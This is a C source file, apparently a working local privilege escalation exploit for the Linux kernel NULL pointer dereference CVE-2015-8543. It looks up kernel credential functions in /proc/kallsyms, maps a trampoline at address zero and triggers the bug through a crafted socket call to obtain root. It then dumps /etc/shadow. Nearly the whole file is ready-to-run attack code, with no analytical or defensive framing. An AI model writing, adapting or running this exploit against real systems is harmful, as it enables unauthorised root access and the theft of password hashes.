/* exploit for CVE-2015-8543 
 * NULL pointer dereference
 *
 */
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>
//---------------------
#include <linux/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
struct cred;
struct task_struct;
void *addr;
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;
    int ret;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (!strcmp(sym, name))
            return addr;
    return NULL;
}
static int __attribute__((regparm(3)))
getroot(void * file, void * vma) {
        commit_creds(prepare_kernel_cred(0));
        return -1;
}
void __attribute__((regparm(3)))
trampoline() {
#ifdef __x86_64__
        asm("mov $getroot, %rax; call *%rax;");
#else
        asm("mov $getroot, %eax; call *%eax;");
#endif
}
void prepare() {
  prepare_kernel_cred = get_ksym("prepare_kernel_cred");
  commit_creds        = get_ksym("commit_creds");
  if (!(prepare_kernel_cred && commit_creds)) {
      fprintf(stderr, "[-] Kernel symbols not found. "
                      "Is your kernel older than 2.6.29?\n");
      exit(1);
  }
  printf("[+] prepare_kernel_cred :%lx\n", prepare_kernel_cred);
  printf("[+] commit_creds :%lx\n", commit_creds);
  addr = mmap(0, 4096, PROT_READ|PROT_WRITE,
                                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  if ( addr == MAP_FAILED  )
        puts("[-] mmap is failed.");
  puts("[+] mmap is successfull.");
  printf("[+] addr : %8lx\n", addr);
  memcpy(addr, &trampoline, 1024);
}
void trigger() {
         int socket_fd;
         struct sockaddr_in addr;
         addr.sin_port = 0;
         addr.sin_addr.s_addr = INADDR_ANY;
         addr.sin_family = 10;
         puts("in trigger!!");
         socket_fd = socket(10,3,0x40000000);
         connect(socket_fd , &addr,16);

}
int main(void) {

      prepare();
      trigger();

      if ( getuid() == 0 ) {
         char *argv[] = {"cat", "/etc/shadow", NULL};
         execve("/bin/cat", argv, NULL);
      }
}
    
